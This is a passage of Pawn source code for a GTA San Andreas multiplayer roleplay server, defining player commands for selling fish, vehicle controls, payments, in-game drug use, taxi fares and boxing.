		SendClientMessage(playerid, COLOR_GREY, "You haven't even caught a fish yet.");
		return 1;
	}
	return 1;
}

CMD:throwbackall(playerid, params[])
{
	if(Fishes[playerid][pWeight1] > 0 || Fishes[playerid][pWeight2] > 0 || Fishes[playerid][pWeight3] > 0 || Fishes[playerid][pWeight4] > 0 || Fishes[playerid][pWeight5] > 0)
	{
		ClearFishes(playerid);
		Fishes[playerid][pLastFish] = 0;
		Fishes[playerid][pFishID] = 0;
		SendClientMessage(playerid, COLOR_GREY, "You have thrown back all your fish.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You haven't even caught a fish yet.");
		return 1;
	}
	return 1;
}

CMD:sellallfish(playerid, params[]) {
	if(!IsAt247(playerid))
		return SendClientMessage(playerid, COLOR_GRAD2, "   You're not in a 24-7!");

	new
	    iPrice,
	    szMessage[128];

	if(Fishes[playerid][pWeight1] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid1]);
		iPrice = (iPrice * Fishes[playerid][pWeight1]) / 10;
		GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
		format(szMessage, sizeof(szMessage), "* You have sold your %s (fish #1) that weights %d, for $%d.", Fishes[playerid][pFish1],Fishes[playerid][pWeight1],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 1);
	}

	if(Fishes[playerid][pWeight2] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid2]);
		iPrice = (iPrice * Fishes[playerid][pWeight2]) / 10;
		GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
		format(szMessage, sizeof(szMessage), "* You have sold your %s (fish #2) that weights %d, for $%d.", Fishes[playerid][pFish2],Fishes[playerid][pWeight2],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 2);
	}

	if(Fishes[playerid][pWeight3] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid3]);
		iPrice = (iPrice * Fishes[playerid][pWeight3]) / 10;
		GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
		format(szMessage, sizeof(szMessage), "* You have sold your %s (fish #3) that weights %d, for $%d.", Fishes[playerid][pFish3],Fishes[playerid][pWeight3],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 3);
	}

	if(Fishes[playerid][pWeight4] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid4]);
		iPrice = (iPrice * Fishes[playerid][pWeight4]) / 10;
		GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
		format(szMessage, sizeof(szMessage), "* You have sold your %s (fish #4) that weights %d, for $%d.", Fishes[playerid][pFish4],Fishes[playerid][pWeight4],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 4);
	}

	if(Fishes[playerid][pWeight5] >= 20) {
		iPrice = FishCost(playerid, Fishes[playerid][pFid5]);
		iPrice = (iPrice * Fishes[playerid][pWeight5]) / 10;
		GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
		format(szMessage, sizeof(szMessage), "* You have sold your %s (fish #5) that weights %d, for $%d.", Fishes[playerid][pFish5],Fishes[playerid][pWeight5],iPrice);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
		GivePlayerCash(playerid, iPrice);
		ClearFishID(playerid, 5);
	}
	return 1;
}

CMD:sellfish(playerid, params[])
{
	if(!IsAt247(playerid))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   You're not in a 24-7!");
		return 1;
	}

	new string[128], fishid;
	if(sscanf(params, "d", fishid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sellfish [fish]");

	new price;
	if(fishid < 1 || fishid > 5) { SendClientMessage(playerid, COLOR_GREY, "   Fish number cant be below 1 or above 5!"); return 1; }
	else if(fishid == 1 && Fishes[playerid][pWeight1] < 1) { SendClientMessage(playerid, COLOR_GREY, "   You didnt even catch a Fish at that number(1)!"); return 1; }
	else if(fishid == 2 && Fishes[playerid][pWeight2] < 1) { SendClientMessage(playerid, COLOR_GREY, "   You didnt even catch a Fish at that number(2)!"); return 1; }
	else if(fishid == 3 && Fishes[playerid][pWeight3] < 1) { SendClientMessage(playerid, COLOR_GREY, "   You didnt even catch a Fish at that number(3)!"); return 1; }
	else if(fishid == 4 && Fishes[playerid][pWeight4] < 1) { SendClientMessage(playerid, COLOR_GREY, "   You didnt even catch a Fish at that number(4)!"); return 1; }
	else if(fishid == 5 && Fishes[playerid][pWeight5] < 1) { SendClientMessage(playerid, COLOR_GREY, "   You didnt even catch a Fish at that number(5)!"); return 1; }

	switch (fishid)
	{
	case 1:
		{
			if(Fishes[playerid][pWeight1] < 20)
			{
				SendClientMessage(playerid, COLOR_WHITE, "We are only interested in Fishes weighting 20 LBS or more.");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid1]);
			price = (price * Fishes[playerid][pWeight1]) / 10;
			GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
			format(string, sizeof(string), "* You have sold your %s that weights %d, for $%d.", Fishes[playerid][pFish1],Fishes[playerid][pWeight1],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 1);
		}
	case 2:
		{
			if(Fishes[playerid][pWeight2] < 20)
			{
				SendClientMessage(playerid, COLOR_WHITE, "We are only interested in Fishes weighting 20 LBS or more.");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid2]);
			price = (price * Fishes[playerid][pWeight2]) / 10;
			GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
			format(string, sizeof(string), "* You have sold your %s that weights %d, for $%d.", Fishes[playerid][pFish2],Fishes[playerid][pWeight2],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 2);
		}
	case 3:
		{
			if(Fishes[playerid][pWeight3] < 20)
			{
				SendClientMessage(playerid, COLOR_WHITE, "We are only interested in Fishes weighting 20 LBS or more.");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid3]);
			price = (price * Fishes[playerid][pWeight3]) / 10;
			GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
			format(string, sizeof(string), "* You have sold your %s that weights %d, for $%d.", Fishes[playerid][pFish3],Fishes[playerid][pWeight3],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 3);
		}
	case 4:
		{
			if(Fishes[playerid][pWeight4] < 20)
			{
				SendClientMessage(playerid, COLOR_WHITE, "We are only interested in Fishes weighting 20 LBS or more.");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid4]);
			price = (price * Fishes[playerid][pWeight4]) / 10;
			GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
			format(string, sizeof(string), "* You have sold your %s that weights %d, for $%d.", Fishes[playerid][pFish4],Fishes[playerid][pWeight4],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 4);
		}
	case 5:
		{
			if(Fishes[playerid][pWeight5] < 20)
			{
				SendClientMessage(playerid, COLOR_WHITE, "We are only interested in Fishes weighting 20 LBS or more.");
				return 1;
			}
			price = FishCost(playerid, Fishes[playerid][pFid5]);
			price = (price * Fishes[playerid][pWeight5]) / 10;
			GameTextForPlayer(playerid, "~g~Fish~n~~r~Sold", 3000, 1);
			format(string, sizeof(string), "* You have sold your %s that weights %d, for $%d.", Fishes[playerid][pFish5],Fishes[playerid][pWeight5],price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, price);
			ClearFishID(playerid, 5);
		}
	}
	Fishes[playerid][pLastFish] = 0;
	Fishes[playerid][pFishID] = 0;
	return 1;
}

CMD:car(playerid, params[])
{
	if(isnull(params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /car [name]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Lights, Trunk, Hood and Window");
		return 1;
	}
	else if(strcmp(params, "lights", true) == 0 && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510) return SendClientMessage(playerid,COLOR_WHITE,"This command can't be used in this vehicle.");
		SetVehicleLights(vehicleid, playerid);
	}
	else if(strcmp(params, "trunk", true) == 0)
  	{
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510)
			{
				return SendClientMessage(playerid,COLOR_WHITE,"This command can't be used in this vehicle.");
			}
			SetVehicleTrunk(vehicleid, playerid);
		}
		else if(!IsPlayerInAnyVehicle(playerid))
		{
			new closestcar = GetClosestCar(playerid);
			if(IsPlayerInRangeOfVehicle(playerid, closestcar, 5.0))
			{
				if(GetVehicleModel(closestcar) == 481 || GetVehicleModel(closestcar) == 509 || GetVehicleModel(closestcar) == 510)
				{
					return SendClientMessage(playerid,COLOR_WHITE,"This command can't be used on this vehicle.");
				}
				SetVehicleTrunk(closestcar, playerid);
			}
		}
	}
	else if(strcmp(params, "hood", true) == 0 && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510 || IsAPlane(vehicleid) || IsABike(vehicleid))
			{
				return SendClientMessage(playerid,COLOR_WHITE,"This command can't be used in this vehicle.");
			}
			SetVehicleHood(vehicleid, playerid);
		}
		else if(!IsPlayerInAnyVehicle(playerid))
		{
			new closestcar = GetClosestCar(playerid);
			if(IsPlayerInRangeOfVehicle(playerid, closestcar, 5.0))
			{
				if(GetVehicleModel(closestcar) == 481 || GetVehicleModel(closestcar) == 509 || GetVehicleModel(closestcar) == 510 || IsAPlane(closestcar) || IsABike(closestcar))
				{
					return SendClientMessage(playerid,COLOR_WHITE,"This command can't be used on this vehicle.");
				}
				SetVehicleHood(closestcar, playerid);
			}
		}
	}
	else if(strcmp(params, "window", true) == 0 && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			if(IsABoat(GetPlayerVehicleID(playerid)) || IsAPlane(GetPlayerVehicleID(playerid)) || IsABike(GetPlayerVehicleID(playerid)) || IsAHelicopter(GetPlayerVehicleID(playerid)))
				return SendClientMessage(playerid, COLOR_GREY, "You can't open the window in these type of vehicles.");

			new vehicleid = GetPlayerVehicleID(playerid);
			if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510 || IsAPlane(vehicleid) || IsABike(vehicleid))
				return SendClientMessage(playerid,COLOR_WHITE,"This command can't be used in this vehicle.");

			new
				string[128];
			if(IsVehicleWindowsDown[vehicleid] == 0) { // Window Open
				IsVehicleWindowsDown[vehicleid] = 1;
				format(string, sizeof(string), "* %s quickly looks around and rolls up their vehicle windows.", GetPlayerNameEx(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			} else {
				IsVehicleWindowsDown[vehicleid] = 0;
				format(string, sizeof(string), "* %s rolls down their window and looks around.", GetPlayerNameEx(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
		}
		else SendClientMessage(playerid,COLOR_WHITE,"You're not in a vehicle or not the driver.");
	}
	return 1;
}

CMD:stopani(playerid, params[])
{
	if(StopaniFloats[playerid][0] != 0)
	{
	    SendClientMessage (playerid, COLOR_GREY, "You're already attempting to clear your animations!");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "You can't do this at this time.");
	}
	else
	{
	    GetPlayerPos(playerid, StopaniFloats[playerid][0], StopaniFloats[playerid][1], StopaniFloats[playerid][2]);
		SetTimerEx("StopaniTimer", 5000, 0, "d", playerid);
		SendClientMessage (playerid, COLOR_YELLOW, "Do not move for 5 seconds to have your animations cleared!");
	}
	return 1;
}

forward StopaniTimer(playerid);
public StopaniTimer(playerid)
{
	new Float:posX, Float:posY, Float:posZ;
    GetPlayerPos(playerid, posX, posY, posZ);

    if(StopaniFloats[playerid][0] != posX || StopaniFloats[playerid][1] != posY || StopaniFloats[playerid][2] != posZ)
	{
	    SendClientMessage (playerid, COLOR_YELLOW, "Failed to clear animations because you moved!");
    	for(new i = 0; i < 3; i++)
		{
			StopaniFloats[playerid][i] = 0;
		}
	    return 1;
	}
	SendClientMessage (playerid, COLOR_YELLOW, "Your animations were cleared!");
	ClearAnimations(playerid, 1);
	SetPlayerSkin(playerid, GetPlayerSkin(playerid));
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);

	for(new i = 0; i < 3; i++)
	{
		StopaniFloats[playerid][i] = 0;
	}
	return 1;
}

CMD:buyclothes(playerid, params[]) {
	if(IsAtClothShop(playerid)) {
		if(PlayerInfo[playerid][pFaction] == 0 && PlayerInfo[playerid][pLeader] == 0 && PlayerInfo[playerid][pVip] == 0)
			ShowPlayerDialogEx(playerid, 3495, DIALOG_STYLE_INPUT, "Skin Selection","Please enter a Skin ID!\n\nNote: Skin Changes cost $250.", "Buy", "Cancel");
		else
		    ShowPlayerDialogEx(playerid, 3495, DIALOG_STYLE_INPUT, "Skin Selection","Please enter a Skin ID!\n\nNote: Your skin changes are free.", "Buy", "Cancel");
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "   You're not in a Clothing Shop!");
	}
	return 1;
}

CMD:pay(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	new
		iTargetID, iCashAmount;

	if(sscanf(params, "ui", iTargetID, iCashAmount)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /pay [playerid/partofname] [amount]");

	if(iTargetID == playerid)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You can't use this command on yourself!");
		return 1;
	}
	if(iCashAmount > 100 && PlayerInfo[playerid][pLevel] < 2)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You must be level 2 to pay over $100");
		return 1;
	}
	if(iCashAmount < 1 || iCashAmount > 10000)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Don't go below $1, or above $10,000 at once.");
		return 1;
	}
	if(IsPlayerConnected(iTargetID))
	{
		if(ProxDetectorS(5.0, playerid, iTargetID))
		{
			new
				szMessage[128], giveplayer[MAX_PLAYER_NAME], sendername[MAX_PLAYER_NAME], playermoney = GetPlayerCash(playerid);

			giveplayer = GetPlayerNameEx(iTargetID);
			sendername = GetPlayerNameEx(playerid);
			if(iCashAmount > 0 && playermoney >= iCashAmount)
			{
				GivePlayerCash(playerid, (0 - iCashAmount));
				GivePlayerCash(iTargetID, iCashAmount);
				format(szMessage, sizeof(szMessage), "   You have sent %s(player: %d), $%d.", GetPlayerNameEx(iTargetID),iTargetID, iCashAmount);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, COLOR_GRAD1, szMessage);
				format(szMessage, sizeof(szMessage), "   You have recieved $%d from %s(player: %d).", iCashAmount, GetPlayerNameEx(playerid), playerid);
				SendClientMessage(iTargetID, COLOR_GRAD1, szMessage);

				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(iTargetID, ipex, sizeof(ipex));
				format(szMessage, sizeof(szMessage), "%s (IP:%s) has paid $%d to %s (IP:%s)", GetPlayerNameEx(playerid), ip, iCashAmount, GetPlayerNameEx(iTargetID), ipex);
				Log("logs/pay.log", szMessage);

				PayWarn[playerid][iTargetID] += iCashAmount;
				if(PayWarn[playerid][iTargetID] >= 10000 && PlayerInfo[playerid][pLevel] <= 3)
				{
					format(szMessage, sizeof(szMessage), "%s (IP:%s) has paid %s (IP:%s) $%d in this session.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(iTargetID), ipex, PayWarn[playerid][iTargetID]);
					ABroadCast(COLOR_YELLOW, szMessage, 1);
				}

				if(iCashAmount >= 100000)
				{
					ABroadCast(COLOR_YELLOW,szMessage,1);
				}

				PlayerPlaySound(iTargetID, 1052, 0.0, 0.0, 0.0);
				format(szMessage, sizeof(szMessage), "* %s takes out some cash, and hands it to %s.", GetPlayerNameEx(playerid) ,GetPlayerNameEx(iTargetID));
				ProxDetector(30.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Invalid transaction amount.");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

CMD:train(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 3.0, 756.229125, 5.614504, 1000.698608) || IsPlayerInRangeOfPoint(playerid, 3.0, 758.43,-78.0,1000.65))
	{
		ShowPlayerDialogEx(playerid, FIGHTMENU, DIALOG_STYLE_LIST, "Fighting Moves", "Boxing		$5000\nElbow		$5000\nKneehead	$5000\nKung-Fu	$5000\nGrabKick	$5000\nNormal", "Learn", "Cancel");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not at the learning area !(inside gym)");
	}
	return 1;
}

CMD:selldrink(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 19 || PlayerInfo[playerid][pJob2] == 19)
	{
		if(IsAtBar(playerid))
		{
			new string[128], giveplayerid;
			if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /selldrink [playerid/partofname]");

			if(IsPlayerConnected(giveplayerid))
			{
				if(playerid == giveplayerid)
				{
					return SendClientMessage(playerid, COLOR_GREY, " You can't sell drinks to yourself.");
				}
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					DrinkOffer[giveplayerid] = playerid;
					format(string, sizeof(string), "* Bartender %s has offered has offered to pour you a drink. /accept drink to select a drink.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* You have offered %s a drink.",GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				}
				else
				{
					return SendClientMessage(playerid, COLOR_GREY, " That player is not near you!");
				}
			}
			else
			{
				return SendClientMessage(playerid, COLOR_GREY, " That player is not connected!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   You're not at a Bar!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not a bartender!");
		return 1;
	}
	return 1;
}

CMD:usepot(playerid, params[]) {
	if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "You can't heal in the event!");

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this while playing paintball.");

	if(PlayerBoxing[playerid] > 0)
		return SendClientMessage(playerid, COLOR_GREY, "You can't use drugs while you're boxing.");

	if(PlayerCuffed[playerid] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't use this command while you're cuffed/tazed.");

	if(UsedWeed[playerid] == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "You must wait 5 seconds before using more drugs.");

	if(GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

	new string[128], Float:health, healthint;
	GetPlayerHealth(playerid, health);
	healthint = floatround(health, floatround_round);
	if(healthint >= 100)
	{
		SendClientMessage(playerid, COLOR_GREY, "You already have full health.");
		return 1;
	}
	if(PlayerInfo[playerid][pPot] > 1)
	{
		if(PlayerStoned[playerid] > 3) return SendClientMessage(playerid, COLOR_GRAD1, "You're too stoned to use pot.");
		PlayerStoned[playerid] += 1;
		if(PlayerStoned[playerid] == 3)
		{
			GameTextForPlayer(playerid, "~w~You're ~b~stoned", 5000, 3);
		}
		if(healthint > 80)
		{
			SetPlayerHealth(playerid, 100);
		}
		else
		{
			SetPlayerHealth(playerid, health + 20.0);
		}
		SendClientMessage(playerid, COLOR_GREY, " You used 2 grams of pot!");
		format(string, sizeof(string), "* %s has used some pot.", GetPlayerNameEx(playerid));
		ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		PlayerInfo[playerid][pPot] -= 2;
		UsedWeed[playerid] = 1;
		SetTimerEx("ClearDrugs", 5000, false, "d", playerid);
		if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid,"SMOKING","M_smkstnd_loop",2.1,0,0,0,0,0);
		switch(GetPVarInt(playerid, "STD")) {
			case 1:
			{
				DeletePVar(playerid, "STD");
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're no longer infected with a STD anymore because of the Drugs!");
			}
			case 2:
			{
				SetPVarInt(playerid, "STD", 1);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You reduced the STD to chlamydia because of the drugs!");
			}
			case 3:
			{
				SetPVarInt(playerid, "STD", 2);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You reduced the STD to gonorrhea because of the drugs!");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY,"You don't have any pot left!");
	}
	return 1;
}

CMD:usecrack(playerid, params[])
{
	if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "You can't heal in the event!");

	new Float:armour;
	GetPlayerArmour(playerid, armour);

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this while playing paintball.");

	if(PlayerBoxing[playerid] > 0)
		return SendClientMessage(playerid, COLOR_GREY, "You can't use drugs while you're boxing.");

	if(PlayerCuffed[playerid] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "You can't use this command while you're cuffed/tazed.");

	if(UsedWeed[playerid] == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "You must wait 5 seconds before using more drugs.");

	if(armour >= 100)
		return SendClientMessage(playerid, COLOR_GREY, "You already have full armor.");

	if(GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");

	if(PlayerInfo[playerid][pCrack] > 1)
	{
		if(PlayerStoned[playerid] > 3) return SendClientMessage(playerid, COLOR_GRAD1, "You're too stoned to use crack.");
		PlayerStoned[playerid] += 1;
		if(PlayerStoned[playerid] == 3)
		{
			GameTextForPlayer(playerid, "~w~You're ~b~stoned", 5000, 3);
		}
		new string[128], Float:PlayersArmour;
		GetPlayerArmour(playerid, PlayersArmour);
		SendClientMessage(playerid, COLOR_GREY, " You used 2 grams of crack!");
		format(string, sizeof(string), "* %s has used some crack.", GetPlayerNameEx(playerid));
		ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		PlayerInfo[playerid][pCrack] -= 2;
		UsedCrack[playerid] = 1;
		SetTimerEx("ClearDrugs", 5000, false, "d", playerid);
		if(PlayersArmour > 90)
		{
			SetPlayerArmourEx(playerid, 100);
		}
		else
		{
			SetPlayerArmourEx(playerid, PlayersArmour + 10.0);
		}
		if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid,"SMOKING","M_smkstnd_loop",2.1,0,0,0,0,0);
		switch(GetPVarInt(playerid, "STD")) {
			case 1:
			{
				DeletePVar(playerid, "STD");
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're no longer infected with an STD anymore because of the drugs!");
			}
			case 2:
			{
				SetPVarInt(playerid, "STD", 1);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You reduced the STD to chlamydia because of the drugs!");
			}
			case 3:
			{
				SetPVarInt(playerid, "STD", 2);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You reduced the STD to gonorrhea because of the drugs!");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You don't have any crack left!");
	}
	return 1;
}

CMD:fare(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 17 || PlayerInfo[playerid][pJob2] == 17)
	{
		new string[128], fare;
		if(sscanf(params, "d", fare)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fare [price]");

		if(TransportDuty[playerid] > 0)
		{
			if(TransportDuty[playerid] == 1)
			{
				TaxiDrivers -= 1;
			}
			else if(TransportDuty[playerid] == 2)
			{
				BusDrivers -= 1;
			}
			TransportDuty[playerid] = 0;
			format(string, sizeof(string), "* You're now off duty and earned $%d.", TransportMoney[playerid]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, TransportMoney[playerid]);
			ConsumingMoney[playerid] = 1; TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
			SetPlayerToTeamColor(playerid);
			return 1;
		}
		if(JobDuty[playerid] != 0) return SendClientMessage(playerid,COLOR_GREY,"You need to get off duty with your mechanic/lawyer job first.");
		new newcar = GetPlayerVehicleID(playerid);
		if(IsAnTaxi(newcar))
		{
			if(GetPlayerState(playerid) == 2)
			{
				if(fare < 1 || fare > 50)
				{
					SendClientMessage(playerid, COLOR_GREY, "   Fare price must be between $1 and $50!");
					return 1;
				}
				TaxiDrivers += 1; TransportDuty[playerid] = 1; TransportValue[playerid] = fare;
				format(string, sizeof(string), "* You're now on-duty as Taxi Driver, fare: $%d.", TransportValue[playerid]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				SetPlayerToTeamColor(playerid);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   You're not the driver!");
				return 1;
			}
		}
		else if(IsAnBus(newcar))
		{
			if(GetPlayerState(playerid) == 2)
			{
				if(fare < 1 || fare > 50)
				{
					SendClientMessage(playerid, COLOR_GREY, "   Fare price must be between $1 and $50!");
					return 1;
				}
				BusDrivers += 1; TransportDuty[playerid] = 2; TransportValue[playerid]=fare;
				format(string, sizeof(string), "* You're now on-duty as Bus Driver, fare: $%d.", TransportValue[playerid]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				SetPlayerToTeamColor(playerid);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   You're not the driver!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not in a taxi or a bus!");
		}
	}
	else
	{
		SendClientMessage(playerid,COLOR_GREY,"You're not a licensed taxi/bus driver!");
		return 1;
	}
	return 1;
}

CMD:fight(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 12 && PlayerInfo[playerid][pJob2] != 12)
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a Boxer!");
		return 1;
	}
	if(InRing > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "   There is already a Fight going on, wait for it to Finish!");
		return 1;
	}
	if(PlayerBoxing[playerid] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're already Fighting!");
		return 1;
	}

	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fight [playerid/partofname]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
			if(IsPlayerInRangeOfPoint(playerid,20.0,765.952270, 4.167977, 1000.719238))
			{
				if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't Box with yourself!"); return 1; }
				format(string, sizeof(string), "* You offered a Boxing Challenge to %s.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Boxer %s wants to Fight with you (type /accept boxing) to accept.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				BoxOffer[giveplayerid] = playerid;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2,"You're not at the Gym!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
			return 1;
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		return 1;
	}
	return 1;
}

CMD:boxstats(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 12 && PlayerInfo[playerid][pJob2] != 12)
	{
